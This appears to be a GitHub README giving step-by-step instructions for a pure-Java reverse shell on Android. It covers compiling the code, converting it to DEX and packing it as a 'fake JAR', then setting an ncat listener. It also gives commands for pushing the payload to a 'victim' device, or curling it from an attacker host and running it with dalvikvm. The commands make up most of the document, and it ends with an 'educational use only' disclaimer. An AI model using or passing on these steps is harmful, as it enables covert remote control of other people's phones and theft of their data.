# Pure Java Android Reverse Shell (with SSL Support)

Original Tutorial: https://malacupa.com/2018/10/25/android-command-line-reverse-shell.html

UPDATE WITH SSL SUPPORT https://github.com/CalfCrusher/JavaAndroidReverseShell/tree/main/SSL

## On Attacker machine - Linux for example -
### (you need android sdk installed and build-tools also) 

#### Compile Java source code in bytecode (if fails for "class error not supported", change the release!)
`javac --release 17 AndroidReverseShell.java`

#### Convert to DEX format 
`~/Library/Android/sdk/build-tools/33.0.0/d8 AndroidReverseShell.class`

#### Create fake JAR file
`zip reverse.jar classes.dex`

#### Set Listener (USE NCAT!)
`ncat -nlvp 1337`

## On victim android device:
`adb push reverse.jar /sdcard` (if Android Debug Tools is enabled)

You can just use DalvikVM bash script from Termux:

`curl http://attackingmachine:9999/reverse.jar -o /sdcard/reverse.jar`<br/>
`cd /system/bin/ && ./dalvikvm -cp /sdcard/reverse.jar AndroidReverseShell`

(pay attention to final "AndroidReverseShell" this must be same name used before, otherwise it fails!)

You can of course create a pure .apk package and sign it using Android Studio or apktool and apksigner.

## Todo

. Support for SSL encryption

## Disclaimer:

For educational use only !

Java code was taken from https://gist.github.com/malacupa/3a98285ad67c98386f7e798b25ef808c#file-reverseshell-java. All credits goes to original developer

